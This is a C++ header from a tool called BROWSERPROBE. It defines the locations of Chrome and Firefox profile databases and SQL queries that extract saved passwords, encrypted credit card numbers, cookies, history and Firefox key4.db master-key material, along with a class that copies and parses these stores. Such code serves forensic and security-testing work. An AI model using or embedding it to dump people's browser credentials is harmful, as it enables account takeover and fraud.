//
// Created by Finger on 8/6/2021.
//

#ifndef BROWSERPROBE_PARSE_H
#define BROWSERPROBE_PARSE_H

#include <string>
#include <utility>
#include "struct.h"
#include "utils.h"
#include "cJSON.h"

#define ChromeCreditFile   "Web Data"
#define ChromePasswordFile "Login Data"
#define ChromeHistoryFile  "History"
#define ChromeDownloadFile "History"
#define ChromeCookieFile   "Cookies"
#define ChromeBookmarkFile "Bookmarks"
#define FirefoxCookieFile  "cookies.sqlite"
#define FirefoxKey4File    "key4.db"
#define FirefoxLoginFile   "logins.json"
#define FirefoxDataFile    "places.sqlite"

#define queryChromiumCredit   "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
#define queryChromiumLogin    "SELECT origin_url, username_value, password_value, date_created FROM logins"
#define queryChromiumHistory  "SELECT url, title, visit_count, last_visit_time FROM urls"
#define queryChromiumDownload "SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads"
#define queryChromiumCookie   "SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies"
#define queryFirefoxHistory   "SELECT id, url, last_visit_date, title, visit_count FROM moz_places"
#define queryFirefoxDownload  "SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id"
#define queryFirefoxBookMarks "SELECT id, url, type, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)"
#define queryFirefoxCookie    "SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies"
#define queryMetaData         "SELECT item1, item2 FROM metaData WHERE id = 'password'"
#define queryNssPrivate       "SELECT a11, a102 from nssPrivate"
#define closeJournalMode      "PRAGMA journal_mode=off"

#define bookmarkID       "id"
#define bookmarkAdded    "date_added"
#define bookmarkUrl      "url"
#define bookmarkName     "name"
#define bookmarkType     "type"
#define bookmarkChildren "children"

enum OutputType{JSON,CSV,CONSOLE};

class Item {
public:
    string mainPath;

    virtual void ChromeParse(char key[]) = 0;

    virtual void FirefoxParse() = 0;

    virtual void OutPut(OutputType format, string browser, string dir) = 0;

    void CopyDB() const;

    void Release() const;

private:
    virtual void outPutJson(string basicString, string string1) = 0;

    virtual void outPutCsv(string basicString, string string1) = 0;

    virtual void outPutConsole(string basicString, string string1) = 0;
};

void Item::CopyDB() const {
    copyToLocalPath(mainPath, filepathBase(mainPath));
}

void Item::Release() const {
    remove(filepathBase(mainPath).c_str());
}

#endif //BROWSERPROBE_PARSE_H
